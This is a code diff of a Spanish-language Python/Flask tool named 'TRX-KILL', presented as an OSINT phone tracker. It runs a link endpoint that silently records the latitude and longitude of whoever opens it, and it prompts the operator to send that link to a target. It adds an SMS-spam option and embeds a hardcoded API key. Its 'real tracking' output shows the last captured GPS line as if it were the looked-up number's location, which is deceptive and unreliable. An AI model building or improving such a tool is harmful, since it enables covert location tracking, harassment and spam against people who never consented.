@@ -5,7 +5,8 @@ app = Flask('TRX-KILL')
 AUTH_PASS = "TRX-KILL-OSINT"
 STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
-API_KEY = "5ZDdh5yEBGFvsa3YWfONVBxqHHPT1stNpJaBEV" 
+# Tu API Key integrada
+API_KEY = "5ZDdh5yEBGFvsa3YWfONVBxqHHPT1stNpJaBEV"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
@@ -22,6 +23,7 @@ def index():
 def log():
     lat = request.args.get('lat', '0')
     lon = request.args.get('lon', '0')
+    # Guardamos latitud y longitud
     with open(LOG_FILE, "a") as f:
         f.write(f"LAT:{lat}|LON:{lon}\n")
     return "OK"
@@ -29,7 +31,7 @@ def log():
 def banner():
     os.system('clear')
     print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
-    print("  -SISTEMA OSINT REAL Y OPERATIVO.")
+    print("  -SISTEMA OSINT: RASTREO Y CONTACTO.")
     print("  -PROHIBIDO SU MAL USO.\n\033[0m")
 
 def main():
@@ -38,7 +40,6 @@ def main():
     while True:
         try:
             banner()
-            # Menú compacto para asegurar visibilidad total
             print(" [1] RASTREAR NÚMERO | [2] LINK-ZP    | [3] CREADOR   | [4] VERSIONES")
             print(" [5] ANALIZAR LINK   | [6] ADM SISTEMA| [7] INFO      | [8] REPOSITORIO")
             print(" [9] PROCESOS        | [10] SPAM-SMS  | [0] SALIR")
@@ -46,25 +47,37 @@ def main():
             sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
             
             if sel == "1":
-                num = input("\nNÚMERO (ej: 5411xxxxxxxx): ")
-                res = requests.get(f"https://api.numlookupapi.com/v1/validate/{num}?apikey={API_KEY}")
+                num = input("\nINGRESA NÚMERO: ")
+                clean_num = "".join(filter(str.isdigit, num))
+                print(f"\n[!] PROCESANDO RASTREO REAL...")
+                
+                # Consulta API
+                res = requests.get(f"https://api.numlookupapi.com/v1/validate/{clean_num}?apikey={API_KEY}")
                 data = res.json()
+                
+                # Lee coordenadas del log
+                gps = "NO HAY UBICACIÓN GPS CAPTURADA"
+                if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
+                    with open(LOG_FILE, 'r') as f:
+                        lines = f.readlines()
+                        if lines: gps = lines[-1].strip()
+
                 if data.get('valid'):
-                    print(f"\n[+] PAÍS: {data.get('country_name')}\n[+] OPERADOR: {data.get('carrier')}\n[+] TIPO: {data.get('line_type')}")
-                else: print("[!] NÚMERO NO VÁLIDO.")
+                    print(f"\n[+] --- RESULTADO ---")
+                    print(f"PAÍS: {data.get('country_name')}")
+                    print(f"OPERADOR: {data.get('carrier')}")
+                    print(f"UBICACIÓN GPS: {gps}")
+                    print(f"ESTADO: ACTIVO EN RED")
+                else:
+                    print("[!] EL NÚMERO NO ES VÁLIDO O NO EXISTE.")
                 input("\n[Enter]...")
+            
             elif sel == "2":
-                print("\n[!] SERVIDOR: http://127.0.0.1:5000\n[!] PRESIONA ENTER PARA VOLVER.")
-                input()
-            elif sel == "3": print("\n# CREADOR: OSCAR (TRX-KILL)"); input()
-            elif sel == "4": print("\n# VERSIÓN: 1.4.5"); input()
-            elif sel == "5": print("\n# ANALIZANDO..."); input()
+                print("\n[!] LINK ACTIVO: http://127.0.0.1:5000")
+                input("\n[!] ENVÍA EL LINK. PRESIONA ENTER PARA VOLVER.")
             elif sel == "6":
                 if input("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
                 input()
-            elif sel == "7": print("\n# SCRIPT OSINT."); input()
-            elif sel == "8": print("\n# REPO PRIVADO"); input()
-            elif sel == "9": print("\n# SERVIDOR ACTIVO"); input()
             elif sel == "10":
                 n = input("NÚMERO: ")
                 m = input("MENSAJE: ")
@@ -72,7 +85,7 @@ def main():
                 print("[!] SMS ENVIADO."); input()
             elif sel == "0": sys.exit()
             
-        except KeyboardInterrupt:
-            continue
+        except Exception as e:
+            print(f"\n[!] ERROR: {e}"); input()
 
 if __name__ == "__main__": main()
